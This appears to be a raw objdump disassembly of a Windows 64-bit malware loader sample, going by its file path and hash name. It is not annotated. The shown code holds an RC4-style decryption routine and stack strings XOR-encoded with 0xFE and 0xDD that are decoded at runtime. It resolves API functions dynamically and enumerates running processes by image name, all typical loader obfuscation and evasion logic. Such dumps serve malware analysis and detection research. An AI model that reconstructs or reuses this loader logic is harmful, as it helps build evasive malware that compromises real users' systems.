
malware_samples/loader/46d456fec38482fbb9b0abae8eb27b839070ce17ee04ed5c07c416b6f9fc7ef0.exe:     file format pei-x86-64


Disassembly of section .text:

0000000180001000 <.text>:
   180001000:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180001005:	55                   	push   %rbp
   180001006:	56                   	push   %rsi
   180001007:	57                   	push   %rdi
   180001008:	41 56                	push   %r14
   18000100a:	41 57                	push   %r15
   18000100c:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   180001013:	48 8b 05 e6 4f 00 00 	mov    0x4fe6(%rip),%rax        # 0x180006000
   18000101a:	48 33 c4             	xor    %rsp,%rax
   18000101d:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   180001024:	00 
   180001025:	45 8b f0             	mov    %r8d,%r14d
   180001028:	4c 8b fa             	mov    %rdx,%r15
   18000102b:	48 8b f1             	mov    %rcx,%rsi
   18000102e:	33 db                	xor    %ebx,%ebx
   180001030:	33 d2                	xor    %edx,%edx
   180001032:	48 8d 4c 24 21       	lea    0x21(%rsp),%rcx
   180001037:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   18000103d:	8b fb                	mov    %ebx,%edi
   18000103f:	49 8b e9             	mov    %r9,%rbp
   180001042:	e8 0e 25 00 00       	call   0x180003555
   180001047:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   18000104c:	4c 8b de             	mov    %rsi,%r11
   18000104f:	4c 2b d8             	sub    %rax,%r11
   180001052:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001057:	44 8b cb             	mov    %ebx,%r9d
   18000105a:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   180001060:	33 d2                	xor    %edx,%edx
   180001062:	47 88 0c 18          	mov    %r9b,(%r8,%r11,1)
   180001066:	41 8b c1             	mov    %r9d,%eax
   180001069:	41 ff c1             	inc    %r9d
   18000106c:	41 f7 f6             	div    %r14d
   18000106f:	42 8a 04 3a          	mov    (%rdx,%r15,1),%al
   180001073:	41 88 00             	mov    %al,(%r8)
   180001076:	49 ff c0             	inc    %r8
   180001079:	45 3b ca             	cmp    %r10d,%r9d
   18000107c:	7c e2                	jl     0x180001060
   18000107e:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180001083:	48 8b d6             	mov    %rsi,%rdx
   180001086:	4c 2b c6             	sub    %rsi,%r8
   180001089:	41 be ff 00 00 80    	mov    $0x800000ff,%r14d
   18000108f:	41 bb 00 ff ff ff    	mov    $0xffffff00,%r11d
   180001095:	42 0f be 04 02       	movsbl (%rdx,%r8,1),%eax
   18000109a:	44 0f b6 0a          	movzbl (%rdx),%r9d
   18000109e:	03 f8                	add    %eax,%edi
   1800010a0:	41 03 f9             	add    %r9d,%edi
   1800010a3:	41 23 fe             	and    %r14d,%edi
   1800010a6:	7d 07                	jge    0x1800010af
   1800010a8:	ff cf                	dec    %edi
   1800010aa:	41 0b fb             	or     %r11d,%edi
   1800010ad:	ff c7                	inc    %edi
   1800010af:	48 63 cf             	movslq %edi,%rcx
   1800010b2:	8a 04 31             	mov    (%rcx,%rsi,1),%al
   1800010b5:	88 02                	mov    %al,(%rdx)
   1800010b7:	48 ff c2             	inc    %rdx
   1800010ba:	44 88 0c 31          	mov    %r9b,(%rcx,%rsi,1)
   1800010be:	49 83 ea 01          	sub    $0x1,%r10
   1800010c2:	75 d1                	jne    0x180001095
   1800010c4:	8b d3                	mov    %ebx,%edx
   1800010c6:	39 9c 24 80 01 00 00 	cmp    %ebx,0x180(%rsp)
   1800010cd:	76 55                	jbe    0x180001124
   1800010cf:	44 8b 94 24 80 01 00 	mov    0x180(%rsp),%r10d
   1800010d6:	00 
   1800010d7:	ff c3                	inc    %ebx
   1800010d9:	41 23 de             	and    %r14d,%ebx
   1800010dc:	7d 07                	jge    0x1800010e5
   1800010de:	ff cb                	dec    %ebx
   1800010e0:	41 0b db             	or     %r11d,%ebx
   1800010e3:	ff c3                	inc    %ebx
   1800010e5:	4c 63 c3             	movslq %ebx,%r8
   1800010e8:	45 0f b6 0c 30       	movzbl (%r8,%rsi,1),%r9d
   1800010ed:	41 03 d1             	add    %r9d,%edx
   1800010f0:	41 23 d6             	and    %r14d,%edx
   1800010f3:	7d 07                	jge    0x1800010fc
   1800010f5:	ff ca                	dec    %edx
   1800010f7:	41 0b d3             	or     %r11d,%edx
   1800010fa:	ff c2                	inc    %edx
   1800010fc:	48 63 ca             	movslq %edx,%rcx
   1800010ff:	8a 04 31             	mov    (%rcx,%rsi,1),%al
   180001102:	41 88 04 30          	mov    %al,(%r8,%rsi,1)
   180001106:	44 88 0c 31          	mov    %r9b,(%rcx,%rsi,1)
   18000110a:	41 0f b6 0c 30       	movzbl (%r8,%rsi,1),%ecx
   18000110f:	49 03 c9             	add    %r9,%rcx
   180001112:	0f b6 c1             	movzbl %cl,%eax
   180001115:	8a 0c 30             	mov    (%rax,%rsi,1),%cl
   180001118:	30 4d 00             	xor    %cl,0x0(%rbp)
   18000111b:	48 ff c5             	inc    %rbp
   18000111e:	49 83 ea 01          	sub    $0x1,%r10
   180001122:	75 b3                	jne    0x1800010d7
   180001124:	48 8b 8c 24 20 01 00 	mov    0x120(%rsp),%rcx
   18000112b:	00 
   18000112c:	48 33 cc             	xor    %rsp,%rcx
   18000112f:	e8 3c 15 00 00       	call   0x180002670
   180001134:	48 8b 9c 24 68 01 00 	mov    0x168(%rsp),%rbx
   18000113b:	00 
   18000113c:	48 81 c4 30 01 00 00 	add    $0x130,%rsp
   180001143:	41 5f                	pop    %r15
   180001145:	41 5e                	pop    %r14
   180001147:	5f                   	pop    %rdi
   180001148:	5e                   	pop    %rsi
   180001149:	5d                   	pop    %rbp
   18000114a:	c3                   	ret
   18000114b:	cc                   	int3
   18000114c:	48 8b c4             	mov    %rsp,%rax
   18000114f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180001153:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180001157:	48 89 78 18          	mov    %rdi,0x18(%rax)
   18000115b:	55                   	push   %rbp
   18000115c:	48 8d a8 c8 e0 ff ff 	lea    -0x1f38(%rax),%rbp
   180001163:	b8 30 20 00 00       	mov    $0x2030,%eax
   180001168:	e8 63 25 00 00       	call   0x1800036d0
   18000116d:	48 2b e0             	sub    %rax,%rsp
   180001170:	48 8b 05 89 4e 00 00 	mov    0x4e89(%rip),%rax        # 0x180006000
   180001177:	48 33 c4             	xor    %rsp,%rax
   18000117a:	48 89 85 20 1f 00 00 	mov    %rax,0x1f20(%rbp)
   180001181:	48 8d 0d 60 31 00 00 	lea    0x3160(%rip),%rcx        # 0x1800042e8
   180001188:	ff 15 8a 2e 00 00    	call   *0x2e8a(%rip)        # 0x180004018
   18000118e:	be ff 01 00 00       	mov    $0x1ff,%esi
   180001193:	48 8d 8d 21 0f 00 00 	lea    0xf21(%rbp),%rcx
   18000119a:	33 db                	xor    %ebx,%ebx
   18000119c:	48 89 05 6d 56 00 00 	mov    %rax,0x566d(%rip)        # 0x180006810
   1800011a3:	44 8b c6             	mov    %esi,%r8d
   1800011a6:	88 9d 20 0f 00 00    	mov    %bl,0xf20(%rbp)
   1800011ac:	33 d2                	xor    %edx,%edx
   1800011ae:	48 8b f8             	mov    %rax,%rdi
   1800011b1:	e8 9f 23 00 00       	call   0x180003555
   1800011b6:	44 8b c6             	mov    %esi,%r8d
   1800011b9:	88 9d 20 13 00 00    	mov    %bl,0x1320(%rbp)
   1800011bf:	33 d2                	xor    %edx,%edx
   1800011c1:	48 8d 8d 21 13 00 00 	lea    0x1321(%rbp),%rcx
   1800011c8:	e8 88 23 00 00       	call   0x180003555
   1800011cd:	44 8b c6             	mov    %esi,%r8d
   1800011d0:	88 9d 20 11 00 00    	mov    %bl,0x1120(%rbp)
   1800011d6:	33 d2                	xor    %edx,%edx
   1800011d8:	48 8d 8d 21 11 00 00 	lea    0x1121(%rbp),%rcx
   1800011df:	e8 71 23 00 00       	call   0x180003555
   1800011e4:	44 8b c6             	mov    %esi,%r8d
   1800011e7:	88 9d 20 15 00 00    	mov    %bl,0x1520(%rbp)
   1800011ed:	33 d2                	xor    %edx,%edx
   1800011ef:	48 8d 8d 21 15 00 00 	lea    0x1521(%rbp),%rcx
   1800011f6:	e8 5a 23 00 00       	call   0x180003555
   1800011fb:	44 8b c6             	mov    %esi,%r8d
   1800011fe:	88 9d 20 17 00 00    	mov    %bl,0x1720(%rbp)
   180001204:	33 d2                	xor    %edx,%edx
   180001206:	48 8d 8d 21 17 00 00 	lea    0x1721(%rbp),%rcx
   18000120d:	e8 43 23 00 00       	call   0x180003555
   180001212:	44 8b c6             	mov    %esi,%r8d
   180001215:	88 9d 20 19 00 00    	mov    %bl,0x1920(%rbp)
   18000121b:	33 d2                	xor    %edx,%edx
   18000121d:	48 8d 8d 21 19 00 00 	lea    0x1921(%rbp),%rcx
   180001224:	e8 2c 23 00 00       	call   0x180003555
   180001229:	44 8b c6             	mov    %esi,%r8d
   18000122c:	88 9d 20 1b 00 00    	mov    %bl,0x1b20(%rbp)
   180001232:	33 d2                	xor    %edx,%edx
   180001234:	48 8d 8d 21 1b 00 00 	lea    0x1b21(%rbp),%rcx
   18000123b:	e8 15 23 00 00       	call   0x180003555
   180001240:	44 8b c6             	mov    %esi,%r8d
   180001243:	88 9d 20 1d 00 00    	mov    %bl,0x1d20(%rbp)
   180001249:	33 d2                	xor    %edx,%edx
   18000124b:	48 8d 8d 21 1d 00 00 	lea    0x1d21(%rbp),%rcx
   180001252:	e8 fe 22 00 00       	call   0x180003555
   180001257:	33 d2                	xor    %edx,%edx
   180001259:	c7 85 20 09 00 00 b1 	movl   $0x909b8eb1,0x920(%rbp)
   180001260:	8e 9b 90 
   180001263:	44 8d 46 f2          	lea    -0xe(%rsi),%r8d
   180001267:	c7 85 24 09 00 00 ad 	movl   $0x9fb3bdad,0x924(%rbp)
   18000126e:	bd b3 9f 
   180001271:	48 8d 8d 2f 09 00 00 	lea    0x92f(%rbp),%rcx
   180001278:	c7 85 28 09 00 00 90 	movl   $0x9b999f90,0x928(%rbp)
   18000127f:	9f 99 9b 
   180001282:	66 c7 85 2c 09 00 00 	movw   $0xbf8c,0x92c(%rbp)
   180001289:	8c bf 
   18000128b:	c6 85 2e 09 00 00 fe 	movb   $0xfe,0x92e(%rbp)
   180001292:	e8 be 22 00 00       	call   0x180003555
   180001297:	33 d2                	xor    %edx,%edx
   180001299:	c7 85 20 0b 00 00 ad 	movl   $0x8c9f8aad,0xb20(%rbp)
   1800012a0:	8a 9f 8c 
   1800012a3:	44 8d 46 f3          	lea    -0xd(%rsi),%r8d
   1800012a7:	c7 85 24 0b 00 00 8a 	movl   $0x8c9bad8a,0xb24(%rbp)
   1800012ae:	ad 9b 8c 
   1800012b1:	48 8d 8d 2e 0b 00 00 	lea    0xb2e(%rbp),%rcx
   1800012b8:	c7 85 28 0b 00 00 88 	movl   $0x9b9d9788,0xb28(%rbp)
   1800012bf:	97 9d 9b 
   1800012c2:	66 c7 85 2c 0b 00 00 	movw   $0xfebf,0xb2c(%rbp)
   1800012c9:	bf fe 
   1800012cb:	e8 85 22 00 00       	call   0x180003555
   1800012d0:	33 d2                	xor    %edx,%edx
   1800012d2:	c7 85 20 0d 00 00 b1 	movl   $0x909b8eb1,0xd20(%rbp)
   1800012d9:	8e 9b 90 
   1800012dc:	44 8d 46 f4          	lea    -0xc(%rsi),%r8d
   1800012e0:	c7 85 24 0d 00 00 ad 	movl   $0x888c9bad,0xd24(%rbp)
   1800012e7:	9b 8c 88 
   1800012ea:	48 8d 8d 2d 0d 00 00 	lea    0xd2d(%rbp),%rcx
   1800012f1:	c7 85 28 0d 00 00 97 	movl   $0xbf9b9d97,0xd28(%rbp)
   1800012f8:	9d 9b bf 
   1800012fb:	c6 85 2c 0d 00 00 fe 	movb   $0xfe,0xd2c(%rbp)
   180001302:	e8 4e 22 00 00       	call   0x180003555
   180001307:	33 d2                	xor    %edx,%edx
   180001309:	c7 85 20 03 00 00 af 	movl   $0x8c9b8baf,0x320(%rbp)
   180001310:	8b 9b 8c 
   180001313:	44 8d 46 ec          	lea    -0x14(%rsi),%r8d
   180001317:	c7 85 24 03 00 00 87 	movl   $0x8c9bad87,0x324(%rbp)
   18000131e:	ad 9b 8c 
   180001321:	48 8d 8d 35 03 00 00 	lea    0x335(%rbp),%rcx
   180001328:	c7 85 28 03 00 00 88 	movl   $0x9b9d9788,0x328(%rbp)
   18000132f:	97 9d 9b 
   180001332:	c7 85 2c 03 00 00 ad 	movl   $0x8a9f8aad,0x32c(%rbp)
   180001339:	8a 9f 8a 
   18000133c:	c7 85 30 03 00 00 8b 	movl   $0x86bb8d8b,0x330(%rbp)
   180001343:	8d bb 86 
   180001346:	c6 85 34 03 00 00 fe 	movb   $0xfe,0x334(%rbp)
   18000134d:	e8 03 22 00 00       	call   0x180003555
   180001352:	33 d2                	xor    %edx,%edx
   180001354:	c7 85 20 05 00 00 bd 	movl   $0x8d9192bd,0x520(%rbp)
   18000135b:	92 91 8d 
   18000135e:	44 8d 46 ee          	lea    -0x12(%rsi),%r8d
   180001362:	c7 85 24 05 00 00 9b 	movl   $0x8c9bad9b,0x524(%rbp)
   180001369:	ad 9b 8c 
   18000136c:	48 8d 8d 33 05 00 00 	lea    0x533(%rbp),%rcx
   180001373:	c7 85 28 05 00 00 88 	movl   $0x9b9d9788,0x528(%rbp)
   18000137a:	97 9d 9b 
   18000137d:	c7 85 2c 05 00 00 b6 	movl   $0x9a909fb6,0x52c(%rbp)
   180001384:	9f 90 9a 
   180001387:	66 c7 85 30 05 00 00 	movw   $0x9b92,0x530(%rbp)
   18000138e:	92 9b 
   180001390:	c6 85 32 05 00 00 fe 	movb   $0xfe,0x532(%rbp)
   180001397:	e8 b9 21 00 00       	call   0x180003555
   18000139c:	33 d2                	xor    %edx,%edx
   18000139e:	c7 85 20 07 00 00 b1 	movl   $0x909b8eb1,0x720(%rbp)
   1800013a5:	8e 9b 90 
   1800013a8:	44 8d 46 f0          	lea    -0x10(%rsi),%r8d
   1800013ac:	c7 85 24 07 00 00 ae 	movl   $0x9d918cae,0x724(%rbp)
   1800013b3:	8c 91 9d 
   1800013b6:	48 8d 8d 31 07 00 00 	lea    0x731(%rbp),%rcx
   1800013bd:	c7 85 28 07 00 00 9b 	movl   $0xaa8d8d9b,0x728(%rbp)
   1800013c4:	8d 8d aa 
   1800013c7:	c7 85 2c 07 00 00 91 	movl   $0x909b9591,0x72c(%rbp)
   1800013ce:	95 9b 90 
   1800013d1:	c6 85 30 07 00 00 fe 	movb   $0xfe,0x730(%rbp)
   1800013d8:	e8 78 21 00 00       	call   0x180003555
   1800013dd:	be ea 01 00 00       	mov    $0x1ea,%esi
   1800013e2:	c7 44 24 20 bf 9a 94 	movl   $0x8b949abf,0x20(%rsp)
   1800013e9:	8b 
   1800013ea:	44 8b c6             	mov    %esi,%r8d
   1800013ed:	c7 44 24 24 8d 8a aa 	movl   $0x91aa8a8d,0x24(%rsp)
   1800013f4:	91 
   1800013f5:	33 d2                	xor    %edx,%edx
   1800013f7:	c7 44 24 28 95 9b 90 	movl   $0xae909b95,0x28(%rsp)
   1800013fe:	ae 
   1800013ff:	48 8d 4c 24 36       	lea    0x36(%rsp),%rcx
   180001404:	c7 44 24 2c 8c 97 88 	movl   $0x9788978c,0x2c(%rsp)
   18000140b:	97 
   18000140c:	c7 44 24 30 92 9b 99 	movl   $0x9b999b92,0x30(%rsp)
   180001413:	9b 
   180001414:	66 c7 44 24 34 8d fe 	movw   $0xfe8d,0x34(%rsp)
   18000141b:	e8 35 21 00 00       	call   0x180003555
   180001420:	44 8b c6             	mov    %esi,%r8d
   180001423:	c7 85 20 01 00 00 b2 	movl   $0x959191b2,0x120(%rbp)
   18000142a:	91 91 95 
   18000142d:	33 d2                	xor    %edx,%edx
   18000142f:	c7 85 24 01 00 00 8b 	movl   $0x8cae8e8b,0x124(%rbp)
   180001436:	8e ae 8c 
   180001439:	48 8d 8d 36 01 00 00 	lea    0x136(%rbp),%rcx
   180001440:	c7 85 28 01 00 00 97 	movl   $0x92978897,0x128(%rbp)
   180001447:	88 97 92 
   18000144a:	c7 85 2c 01 00 00 9b 	movl   $0xa89b999b,0x12c(%rbp)
   180001451:	99 9b a8 
   180001454:	c7 85 30 01 00 00 9f 	movl   $0x9b8b929f,0x130(%rbp)
   18000145b:	92 8b 9b 
   18000145e:	66 c7 85 34 01 00 00 	movw   $0xfebf,0x134(%rbp)
   180001465:	bf fe 
   180001467:	e8 e9 20 00 00       	call   0x180003555
   18000146c:	8b cb                	mov    %ebx,%ecx
   18000146e:	44 8d 46 16          	lea    0x16(%rsi),%r8d
   180001472:	b2 fe                	mov    $0xfe,%dl
   180001474:	8a 84 0d 20 09 00 00 	mov    0x920(%rbp,%rcx,1),%al
   18000147b:	32 c2                	xor    %dl,%al
   18000147d:	88 84 0d 20 0f 00 00 	mov    %al,0xf20(%rbp,%rcx,1)
   180001484:	48 ff c1             	inc    %rcx
   180001487:	49 3b c8             	cmp    %r8,%rcx
   18000148a:	7c e8                	jl     0x180001474
   18000148c:	48 8b cb             	mov    %rbx,%rcx
   18000148f:	8a 84 0d 20 0b 00 00 	mov    0xb20(%rbp,%rcx,1),%al
   180001496:	32 c2                	xor    %dl,%al
   180001498:	88 84 0d 20 11 00 00 	mov    %al,0x1120(%rbp,%rcx,1)
   18000149f:	48 ff c1             	inc    %rcx
   1800014a2:	49 3b c8             	cmp    %r8,%rcx
   1800014a5:	7c e8                	jl     0x18000148f
   1800014a7:	48 8b cb             	mov    %rbx,%rcx
   1800014aa:	8a 84 0d 20 0d 00 00 	mov    0xd20(%rbp,%rcx,1),%al
   1800014b1:	32 c2                	xor    %dl,%al
   1800014b3:	88 84 0d 20 13 00 00 	mov    %al,0x1320(%rbp,%rcx,1)
   1800014ba:	48 ff c1             	inc    %rcx
   1800014bd:	49 3b c8             	cmp    %r8,%rcx
   1800014c0:	7c e8                	jl     0x1800014aa
   1800014c2:	48 8b cb             	mov    %rbx,%rcx
   1800014c5:	8a 84 0d 20 03 00 00 	mov    0x320(%rbp,%rcx,1),%al
   1800014cc:	32 c2                	xor    %dl,%al
   1800014ce:	88 84 0d 20 15 00 00 	mov    %al,0x1520(%rbp,%rcx,1)
   1800014d5:	48 ff c1             	inc    %rcx
   1800014d8:	49 3b c8             	cmp    %r8,%rcx
   1800014db:	7c e8                	jl     0x1800014c5
   1800014dd:	48 8b cb             	mov    %rbx,%rcx
   1800014e0:	8a 84 0d 20 05 00 00 	mov    0x520(%rbp,%rcx,1),%al
   1800014e7:	32 c2                	xor    %dl,%al
   1800014e9:	88 84 0d 20 17 00 00 	mov    %al,0x1720(%rbp,%rcx,1)
   1800014f0:	48 ff c1             	inc    %rcx
   1800014f3:	49 3b c8             	cmp    %r8,%rcx
   1800014f6:	7c e8                	jl     0x1800014e0
   1800014f8:	48 8b cb             	mov    %rbx,%rcx
   1800014fb:	8a 84 0d 20 07 00 00 	mov    0x720(%rbp,%rcx,1),%al
   180001502:	32 c2                	xor    %dl,%al
   180001504:	88 84 0d 20 19 00 00 	mov    %al,0x1920(%rbp,%rcx,1)
   18000150b:	48 ff c1             	inc    %rcx
   18000150e:	49 3b c8             	cmp    %r8,%rcx
   180001511:	7c e8                	jl     0x1800014fb
   180001513:	48 8b cb             	mov    %rbx,%rcx
   180001516:	8a 44 0c 20          	mov    0x20(%rsp,%rcx,1),%al
   18000151a:	32 c2                	xor    %dl,%al
   18000151c:	88 84 0d 20 1b 00 00 	mov    %al,0x1b20(%rbp,%rcx,1)
   180001523:	48 ff c1             	inc    %rcx
   180001526:	49 3b c8             	cmp    %r8,%rcx
   180001529:	7c eb                	jl     0x180001516
   18000152b:	8a 84 1d 20 01 00 00 	mov    0x120(%rbp,%rbx,1),%al
   180001532:	32 c2                	xor    %dl,%al
   180001534:	88 84 1d 20 1d 00 00 	mov    %al,0x1d20(%rbp,%rbx,1)
   18000153b:	48 ff c3             	inc    %rbx
   18000153e:	49 3b d8             	cmp    %r8,%rbx
   180001541:	7c e8                	jl     0x18000152b
   180001543:	48 8d 95 20 0f 00 00 	lea    0xf20(%rbp),%rdx
   18000154a:	48 8b cf             	mov    %rdi,%rcx
   18000154d:	ff 15 cd 2a 00 00    	call   *0x2acd(%rip)        # 0x180004020
   180001553:	48 8b 0d b6 52 00 00 	mov    0x52b6(%rip),%rcx        # 0x180006810
   18000155a:	48 8d 95 20 11 00 00 	lea    0x1120(%rbp),%rdx
   180001561:	ff 15 b9 2a 00 00    	call   *0x2ab9(%rip)        # 0x180004020
   180001567:	48 8b 0d a2 52 00 00 	mov    0x52a2(%rip),%rcx        # 0x180006810
   18000156e:	48 8d 95 20 13 00 00 	lea    0x1320(%rbp),%rdx
   180001575:	ff 15 a5 2a 00 00    	call   *0x2aa5(%rip)        # 0x180004020
   18000157b:	48 8b 0d 8e 52 00 00 	mov    0x528e(%rip),%rcx        # 0x180006810
   180001582:	48 8d 95 20 15 00 00 	lea    0x1520(%rbp),%rdx
   180001589:	ff 15 91 2a 00 00    	call   *0x2a91(%rip)        # 0x180004020
   18000158f:	48 8b 0d 7a 52 00 00 	mov    0x527a(%rip),%rcx        # 0x180006810
   180001596:	48 8d 95 20 17 00 00 	lea    0x1720(%rbp),%rdx
   18000159d:	ff 15 7d 2a 00 00    	call   *0x2a7d(%rip)        # 0x180004020
   1800015a3:	48 8b 0d 66 52 00 00 	mov    0x5266(%rip),%rcx        # 0x180006810
   1800015aa:	48 8d 95 20 19 00 00 	lea    0x1920(%rbp),%rdx
   1800015b1:	ff 15 69 2a 00 00    	call   *0x2a69(%rip)        # 0x180004020
   1800015b7:	48 8b 0d 52 52 00 00 	mov    0x5252(%rip),%rcx        # 0x180006810
   1800015be:	48 8d 95 20 1b 00 00 	lea    0x1b20(%rbp),%rdx
   1800015c5:	48 89 05 3c 52 00 00 	mov    %rax,0x523c(%rip)        # 0x180006808
   1800015cc:	ff 15 4e 2a 00 00    	call   *0x2a4e(%rip)        # 0x180004020
   1800015d2:	48 8b 0d 37 52 00 00 	mov    0x5237(%rip),%rcx        # 0x180006810
   1800015d9:	48 8d 95 20 1d 00 00 	lea    0x1d20(%rbp),%rdx
   1800015e0:	48 89 05 31 52 00 00 	mov    %rax,0x5231(%rip)        # 0x180006818
   1800015e7:	ff 15 33 2a 00 00    	call   *0x2a33(%rip)        # 0x180004020
   1800015ed:	48 89 05 0c 52 00 00 	mov    %rax,0x520c(%rip)        # 0x180006800
   1800015f4:	48 8b 8d 20 1f 00 00 	mov    0x1f20(%rbp),%rcx
   1800015fb:	48 33 cc             	xor    %rsp,%rcx
   1800015fe:	e8 6d 10 00 00       	call   0x180002670
   180001603:	4c 8d 9c 24 30 20 00 	lea    0x2030(%rsp),%r11
   18000160a:	00 
   18000160b:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   18000160f:	49 8b 73 18          	mov    0x18(%r11),%rsi
   180001613:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   180001617:	49 8b e3             	mov    %r11,%rsp
   18000161a:	5d                   	pop    %rbp
   18000161b:	c3                   	ret
   18000161c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001621:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180001626:	56                   	push   %rsi
   180001627:	57                   	push   %rdi
   180001628:	41 56                	push   %r14
   18000162a:	48 83 ec 20          	sub    $0x20,%rsp
   18000162e:	48 8b e9             	mov    %rcx,%rbp
   180001631:	33 db                	xor    %ebx,%ebx
   180001633:	b9 00 00 10 00       	mov    $0x100000,%ecx
   180001638:	ff 15 d2 2a 00 00    	call   *0x2ad2(%rip)        # 0x180004110
   18000163e:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   180001642:	89 5c 24 48          	mov    %ebx,0x48(%rsp)
   180001646:	48 8b f9             	mov    %rcx,%rdi
   180001649:	48 8b f0             	mov    %rax,%rsi
   18000164c:	48 ff c7             	inc    %rdi
   18000164f:	38 1c 2f             	cmp    %bl,(%rdi,%rbp,1)
   180001652:	75 f8                	jne    0x18000164c
   180001654:	48 ff c7             	inc    %rdi
   180001657:	b8 02 00 00 00       	mov    $0x2,%eax
   18000165c:	48 f7 e7             	mul    %rdi
   18000165f:	48 0f 40 c1          	cmovo  %rcx,%rax
   180001663:	48 8b c8             	mov    %rax,%rcx
   180001666:	e8 25 10 00 00       	call   0x180002690
   18000166b:	4c 8b c7             	mov    %rdi,%r8
   18000166e:	48 8b d5             	mov    %rbp,%rdx
   180001671:	48 8b c8             	mov    %rax,%rcx
   180001674:	4c 8b f0             	mov    %rax,%r14
   180001677:	ff 15 73 2a 00 00    	call   *0x2a73(%rip)        # 0x1800040f0
   18000167d:	4c 8d 4c 24 48       	lea    0x48(%rsp),%r9
   180001682:	41 b8 00 00 10 00    	mov    $0x100000,%r8d
   180001688:	48 8b d6             	mov    %rsi,%rdx
   18000168b:	b9 05 00 00 00       	mov    $0x5,%ecx
   180001690:	e8 4b 0f 00 00       	call   0x1800025e0
   180001695:	85 c0                	test   %eax,%eax
   180001697:	78 2b                	js     0x1800016c4
   180001699:	48 8b fe             	mov    %rsi,%rdi
   18000169c:	39 1e                	cmp    %ebx,(%rsi)
   18000169e:	74 24                	je     0x1800016c4
   1800016a0:	48 8b 4f 40          	mov    0x40(%rdi),%rcx
   1800016a4:	48 85 c9             	test   %rcx,%rcx
   1800016a7:	74 0d                	je     0x1800016b6
   1800016a9:	49 8b d6             	mov    %r14,%rdx
   1800016ac:	ff 15 de 2a 00 00    	call   *0x2ade(%rip)        # 0x180004190
   1800016b2:	85 c0                	test   %eax,%eax
   1800016b4:	74 0b                	je     0x1800016c1
   1800016b6:	8b 07                	mov    (%rdi),%eax
   1800016b8:	48 03 f8             	add    %rax,%rdi
   1800016bb:	39 1f                	cmp    %ebx,(%rdi)
   1800016bd:	75 e1                	jne    0x1800016a0
   1800016bf:	eb 03                	jmp    0x1800016c4
   1800016c1:	8b 5f 50             	mov    0x50(%rdi),%ebx
   1800016c4:	48 8b ce             	mov    %rsi,%rcx
   1800016c7:	ff 15 3b 2a 00 00    	call   *0x2a3b(%rip)        # 0x180004108
   1800016cd:	48 8b 6c 24 50       	mov    0x50(%rsp),%rbp
   1800016d2:	8b c3                	mov    %ebx,%eax
   1800016d4:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1800016d9:	48 83 c4 20          	add    $0x20,%rsp
   1800016dd:	41 5e                	pop    %r14
   1800016df:	5f                   	pop    %rdi
   1800016e0:	5e                   	pop    %rsi
   1800016e1:	c3                   	ret
   1800016e2:	cc                   	int3
   1800016e3:	cc                   	int3
   1800016e4:	48 8b c4             	mov    %rsp,%rax
   1800016e7:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1800016eb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1800016ef:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1800016f3:	55                   	push   %rbp
   1800016f4:	41 54                	push   %r12
   1800016f6:	41 56                	push   %r14
   1800016f8:	48 8d a8 b8 fe ff ff 	lea    -0x148(%rax),%rbp
   1800016ff:	48 81 ec 30 02 00 00 	sub    $0x230,%rsp
   180001706:	48 8b 05 f3 48 00 00 	mov    0x48f3(%rip),%rax        # 0x180006000
   18000170d:	48 33 c4             	xor    %rsp,%rax
   180001710:	48 89 85 20 01 00 00 	mov    %rax,0x120(%rbp)
   180001717:	33 db                	xor    %ebx,%ebx
   180001719:	4c 8b f1             	mov    %rcx,%r14
   18000171c:	33 d2                	xor    %edx,%edx
   18000171e:	89 5c 24 34          	mov    %ebx,0x34(%rsp)
   180001722:	48 8d 4d b1          	lea    -0x4f(%rbp),%rcx
   180001726:	88 5d b0             	mov    %bl,-0x50(%rbp)
   180001729:	44 8d 63 63          	lea    0x63(%rbx),%r12d
   18000172d:	45 8b c4             	mov    %r12d,%r8d
   180001730:	e8 20 1e 00 00       	call   0x180003555
   180001735:	8b cb                	mov    %ebx,%ecx
   180001737:	48 8d 3d c2 e8 ff ff 	lea    -0x173e(%rip),%rdi        # 0x180000000
   18000173e:	8a 84 39 80 60 00 00 	mov    0x6080(%rcx,%rdi,1),%al
   180001745:	34 dd                	xor    $0xdd,%al
   180001747:	88 44 0d b0          	mov    %al,-0x50(%rbp,%rcx,1)
   18000174b:	48 ff c1             	inc    %rcx
   18000174e:	48 83 f9 64          	cmp    $0x64,%rcx
   180001752:	7c ea                	jl     0x18000173e
   180001754:	48 8d 15 9d 2b 00 00 	lea    0x2b9d(%rip),%rdx        # 0x1800042f8
   18000175b:	48 8d 4d b0          	lea    -0x50(%rbp),%rcx
   18000175f:	ff 15 0b 2a 00 00    	call   *0x2a0b(%rip)        # 0x180004170
   180001765:	48 8b f0             	mov    %rax,%rsi
   180001768:	48 85 c0             	test   %rax,%rax
   18000176b:	0f 84 4c 01 00 00    	je     0x1800018bd
   180001771:	33 c0                	xor    %eax,%eax
   180001773:	88 5c 24 30          	mov    %bl,0x30(%rsp)
   180001777:	4c 8b ce             	mov    %rsi,%r9
   18000177a:	66 89 44 24 31       	mov    %ax,0x31(%rsp)
   18000177f:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180001784:	88 44 24 33          	mov    %al,0x33(%rsp)
   180001788:	8d 50 01             	lea    0x1(%rax),%edx
   18000178b:	44 8d 40 04          	lea    0x4(%rax),%r8d
   18000178f:	ff 15 d3 29 00 00    	call   *0x29d3(%rip)        # 0x180004168
   180001795:	4d 8b c4             	mov    %r12,%r8
   180001798:	88 5c 24 40          	mov    %bl,0x40(%rsp)
   18000179c:	33 d2                	xor    %edx,%edx
   18000179e:	48 8d 4c 24 41       	lea    0x41(%rsp),%rcx
